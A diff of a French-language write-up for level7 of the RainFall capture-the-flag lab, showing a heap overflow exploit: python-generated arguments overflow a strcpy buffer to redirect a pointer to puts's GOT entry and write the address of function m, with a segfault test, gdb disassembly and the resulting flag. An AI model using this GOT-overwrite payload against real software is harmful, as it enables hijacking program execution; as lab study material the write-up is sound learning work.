@@ -103,15 +103,29 @@ objdump -t ./level7  | grep ".text"
 
 
 
-./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"')
+$(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1642785922
 
+La faille vient de strcpy, c'est un buffer overflow.
+strcpy n'est pas protege et ne verifie pas la taille de ce qu'il va copier
+Pour passer le premier strcpy on sait que le buffer peut contenir 20 bytes, on
+peut le confirmer en voyant qu'avec 21 il segfault :
 
-Premier strcpy qui ecrit dans le malloc les 20 A dans le buffer, ce qui le force
-a reecrire son pointeur sur le prochain bloc ("chunk").
-Qui de base pointe sur le 2eme buffer mais qui apres modification pointe sur
-l'adddresse GOT de puts
+./level7 $(python -c 'print "A" * 21') "BBBB"
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20') "BBBB"
+~~
+
+Avec le premier argument on se place sur l'addresse GOT de puts.
+Comme RELRO n'est pas actif on peut ecrire sur GOT.
+Le 2nd strcpy permet lui d'ecrire sur le pointeur de strcpy (1) l'addresse de 
+la fonction m que l'on souhaite executer.
+Ainsi, lors de l'execution du programme l'appel de puts qui va chercher "sa 
+vraie" addresse sur la table PLT est enfait l'addresse de m qui est ensuite
+executer et nous permet d'avoir le flag.
+
 
 gdb) disas 0x8048400
 Dump of assembler code for function puts@plt:
@@ -125,5 +139,3 @@ Dump of assembler code for function puts@got.plt:
    0x08049929 <+1>:	test   %al,(%eax,%ecx,1)
 End of assembler dump.
 
-
-Le 2eme strcpy ecrit l'addresse de la fonction m.......
